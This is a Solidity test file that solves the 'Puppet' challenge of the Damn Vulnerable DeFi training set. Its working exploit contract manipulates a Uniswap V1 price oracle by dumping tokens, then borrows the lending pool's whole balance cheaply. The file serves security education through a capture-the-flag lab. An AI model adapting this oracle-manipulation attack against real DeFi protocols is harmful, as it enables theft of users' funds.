// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/DamnValuableToken.sol";

import "src/Puppet/PuppetPool.sol";

// Challenge #8 - Puppet
// https://www.damnvulnerabledefi.xyz/challenges/puppet/

contract Attack is Test {
    DamnValuableToken public token;
    UniswapV1Exchange public exchangeTemplate;
    UniswapV1Exchange public uniswapExchange;
    UniswapV1Factory public uniswapFactory;
    PuppetPool public lendingPool;

    address public hacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("hacker"))))));

    uint256 public constant UNISWAP_INITIAL_TOKEN_RESERVE = 10 * 1e18;
    uint256 public constant UNISWAP_INITIAL_ETH_RESERVE = 10 * 1e18;

    uint256 public constant PLAYER_INITIAL_TOKEN_BALANCE = 1000 * 1e18;
    uint256 public constant PLAYER_INITIAL_ETH_BALANCE = 25 * 1e18;

    uint256 public constant POOL_INITIAL_TOKEN_BALANCE = 100000 * 1e18;

    function setUp() public {
        vm.deal(hacker, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(hacker.balance, PLAYER_INITIAL_ETH_BALANCE);

        token = new DamnValuableToken();

        exchangeTemplate = UniswapV1Exchange(deployCode("./src/Puppet/build-uniswap-v1/UniswapV1Exchange.json"));
        uniswapFactory = UniswapV1Factory(deployCode("./src/Puppet/build-uniswap-v1/UniswapV1Factory.json"));
        uniswapFactory.initializeFactory(address(exchangeTemplate));

        uniswapExchange = UniswapV1Exchange(uniswapFactory.createExchange{gas: 1e6}(address(token)));

        lendingPool = new PuppetPool(address(token), address(uniswapExchange));

        token.approve(address(uniswapExchange), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapExchange.addLiquidity{value: UNISWAP_INITIAL_ETH_RESERVE, gas: 1e6}(
            0, UNISWAP_INITIAL_TOKEN_RESERVE, block.timestamp * 2
        );

        assertEq(
            uniswapExchange.getTokenToEthInputPrice{gas: 1e6}(1e18),
            calculateTokenToEthInputPrice(1e18, UNISWAP_INITIAL_TOKEN_RESERVE, UNISWAP_INITIAL_ETH_RESERVE)
        );

        token.transfer(hacker, PLAYER_INITIAL_TOKEN_BALANCE);
        token.transfer(address(lendingPool), POOL_INITIAL_TOKEN_BALANCE);

        assertEq(lendingPool.calculateDepositRequired(1e18), 2 * 1e18);
        assertEq(lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE), POOL_INITIAL_TOKEN_BALANCE * 2);
    }

    function testExploit() public {
        // Attack Code:
        vm.startPrank(hacker);
        Exploit exploit =
            new Exploit{value:15 ether}(address(uniswapExchange), address(lendingPool), address(token), address(hacker));
        token.transfer(address(exploit), PLAYER_INITIAL_TOKEN_BALANCE);
        vm.stopPrank();
        exploit.swap();

        assertEq(vm.getNonce(hacker), 1);
        assertEq(token.balanceOf(address(lendingPool)), 0);
        assertGe(token.balanceOf(hacker), POOL_INITIAL_TOKEN_BALANCE);
    }

    // Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
    function calculateTokenToEthInputPrice(uint256 tokensSold, uint256 tokensInReserve, uint256 etherInReserve)
        internal
        pure
        returns (uint256)
    {
        return (tokensSold * 997 * etherInReserve) / (tokensInReserve * 1000 + tokensSold * 997);
    }
}

contract Exploit {
    uint256 amount1 = 1000 ether;
    uint256 amount2 = 100000 ether;
    PuppetPool public pool;
    DamnValuableToken public token;
    UniswapV1Exchange public exchange;
    address public hacker;
    uint256 public count;

    event Error(bytes err);

    constructor(address _exchange, address _pool, address _token, address _hacker) payable {
        exchange = UniswapV1Exchange(_exchange);
        pool = PuppetPool(_pool);
        token = DamnValuableToken(_token);
        hacker = _hacker;
    }

    function swap() public {
        token.approve(address(exchange), amount1);
        exchange.tokenToEthSwapInput(amount1, 1, block.timestamp + 5000);
        pool.borrow{value: 20 ether, gas: 1000000}(amount2, hacker);
    }

    receive() external payable {}
}

// ------ Uniswap V1 Interface ------

interface UniswapV1Exchange {
    function addLiquidity(uint256 min_liquidity, uint256 max_tokens, uint256 deadline)
        external
        payable
        returns (uint256);

    function balanceOf(address _owner) external view returns (uint256);

    function tokenToEthSwapInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline) external returns (uint256);

    function ethToTokenSwapOutput(uint256 tokens_bought, uint256 deadline) external returns (uint256);

    function getTokenToEthInputPrice(uint256 tokens_sold) external view returns (uint256);
}

interface UniswapV1Factory {
    function initializeFactory(address template) external;

    function createExchange(address token) external returns (address);
}
